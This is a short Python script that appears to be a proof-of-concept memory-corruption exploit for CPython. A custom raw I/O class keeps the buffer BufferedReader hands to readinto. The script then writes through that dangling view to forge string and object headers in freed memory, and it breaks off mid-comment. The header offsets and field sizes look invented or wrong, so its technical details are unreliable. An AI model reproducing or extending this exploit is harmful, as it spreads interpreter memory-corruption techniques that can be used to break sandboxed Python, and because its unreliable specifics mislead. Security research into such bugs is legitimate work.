import io

class File(io.RawIOBase):
    def readinto(self, buf):
        global view
        view = buf
    def readable(self):
        return True

f = io.BufferedReader(File())
f.read(1)
del f

# Now view is a writable buffer. We can write out of bounds and trigger a
# buffer overflow, with a controllable destination:

view[100:104] = b'1234'

# Now we have a 4-byte overflow in the underlying buffer. We use some
# geometry to make the overflow happen inside a Python string struct. For
# simplicity we assume it's a short string.

# First we write the string header, including the length and the hash field
# (which we don't use).

view[67:67+2] = b'\xad\xde'   # length
view[69:69+4] = b'\xad\xde\xad\xde' # hash

# The string data is stored immediately after the header.

view[73:73+2] = b'\xad\xde'

# Next we write the object header. This is more complicated because we have
# to ensure that the object ends up in the arena at a precise location.

# First the length of the type object. This has to be big enough to
# accommodate
